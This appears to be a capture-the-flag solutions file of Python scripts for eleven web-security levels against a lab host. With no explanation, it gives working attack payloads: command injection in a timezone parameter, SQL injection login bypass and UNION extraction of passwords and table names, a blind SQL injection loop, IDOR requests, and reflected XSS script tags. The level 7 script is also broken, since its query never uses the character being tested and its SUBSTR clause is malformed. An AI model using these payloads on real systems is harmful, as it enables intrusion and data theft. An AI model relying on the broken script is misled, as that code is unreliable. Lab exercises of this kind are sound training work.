# Web Security

### level 1

```python
import requests

response = requests.get("http://challenge.localhost?path=/flag")
print(response.text)
```

### level 2

```python
import requests

response = requests.get("http://challenge.localhost/?timezone=MST date")
print(response.text)
```

### level 3

```python
import requests

response = requests.get("http://challenge.localhost/?user=1")
print(response.text)
```

### level 4

```python
import requests

data={
	"username": 'flag" --',
	"password": 'flag'
}

response = requests.post("http://challenge.localhost/", data = data)
print(response.text)
```

### level 5

```python
import requests

params={
	"query": '" UNION SELECT password FROM users --'
}

response = requests.post("http://challenge.localhost/", params = params)
print(response.text)
```

### level 6

```python
import requests

params={
	"query": '" UNION SELECT tbl_name FROM sqlite_master --'
}

response = requests.post("http://challenge.localhost/", params = params)
print(response.text)
```

```python
import requests

params={
	"query": '" UNION SELECT password FROM table9110909979364706165 --'
}

response = requests.post("http://challenge.localhost/", params = params)
print(response.text)
```

### level 7

```python
import string
import requests

searchspace = string.ascii_letters + string.digits + '{}._-'
solution = ''

while True:
	for char in searchspace:
		data = {
			"username": f'" OR SUBSTR(username, 1, 1 --',
			"password": 'flag'
		}
		
		response = requests.post("http://challenge.localhost/", data = data)
		if response.text.startswith("Hello"):
			solution += char
			print(solution)
			break
```

### level 8

```python
import requests

response = requests.get("http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=<script>alert(1)</script>")
print(response.text)
```

### level 9

```python
import requests

response = requests.get("http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=</textarea><script>alert(1)</script><textarea>")
print(response.text)
```

### level 10

```python
import requests

params = {
	"url": "http://challenge.localhost/leak"
}

response = requests.get("http://challenge.localhost/visit", params = params)
print(response.text)
```

```python
import requests

params = {
	"user": 1
}

response = requests.get("http://challenge.localhost/info", params = params)
print(response.text)
```

### level 11

```python
import requests

params = {
	"url": "http://challenge.localhost/leak"
}

response = requests.get("http://challenge.localhost/visit", params = params)
print(response.text)
```

```python
import requests

params = {
	"user": 1
}

response = requests.get("http://challenge.localhost/info", params = params)
print(response.text)
```
